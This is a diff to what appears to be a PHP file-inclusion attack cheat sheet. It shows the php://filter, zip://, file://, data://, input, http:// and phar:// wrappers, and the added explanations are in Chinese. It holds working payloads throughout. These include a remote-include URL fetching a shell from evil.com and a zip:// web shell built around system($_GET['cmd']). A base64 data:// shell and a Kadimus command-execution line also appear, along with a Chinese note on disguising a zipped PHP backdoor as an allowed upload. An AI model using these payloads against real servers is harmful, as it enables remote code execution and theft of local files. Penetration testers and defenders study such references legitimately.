@@ -112,7 +112,7 @@ http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
 
 
 ## lfi--rfi-使用包装器
-
+php包装器：https://www.php.net/manual/en/wrappers.php.php
 ### Wrapper php://filter
 
 The part "php://filter" is case insensitive
@@ -140,7 +140,7 @@ curl "http://example.com/index.php?page=php://filter/convert.base64-encode/resou
 ```
 
 ### Wrapper zip://
-
+压缩后门php，改成允许上传的文件格式。然后使用包装器zip解压成php
 ```python
 echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
 zip payload.zip payload.php;
@@ -149,8 +149,20 @@ rm payload.php
 
 http://example.com/index.php?page=zip://shell.jpg%23payload.php
 ```
-
+### Wrapper file://
+```
+访问本地文件系统
+/path/to/file.ext
+relative/path/to/file.ext
+fileInCwd.ext
+C:/path/to/winfile.ext
+C:\path\to\winfile.ext
+\\smbserver\share\path\to\winfile.ext
+file:///path/to/file.ext
+```
 ### Wrapper data://
+说明：从data中读取数据
+用法：data://text/plain;base64.
 
 ```powershell
 http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
@@ -179,7 +191,10 @@ Alternatively, Kadimus has a module to automate this attack.
 ```powershell
 ./kadimus -u "https://example.com/index.php?page=php://input%00"  -C '<?php echo shell_exec("id"); ?>' -T input
 ```
-
+### Wrapper http://
+```powershell
+访问http资源
+```
 ### Wrapper phar://
 
 Create a phar file with a serialized object in its meta-data.
